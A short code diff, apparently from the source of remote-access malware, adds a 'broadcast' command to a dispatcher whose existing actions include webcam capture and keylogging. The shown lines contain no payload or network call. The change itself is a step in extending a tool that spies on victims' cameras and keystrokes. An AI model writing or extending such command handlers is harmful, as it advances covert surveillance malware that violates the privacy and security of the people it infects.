@@ -28,6 +28,8 @@ Action getAction(string name) {
         return ACTION_WEBCAM;
     } else if (startsWith(name, "keylog")) {
         return ACTION_KEYLOG;
+    } else if (startsWith(name, "broadcast")) {
+        return ACTION_BROADCAST;
     } 
     return ACTION_INVALID;
 }
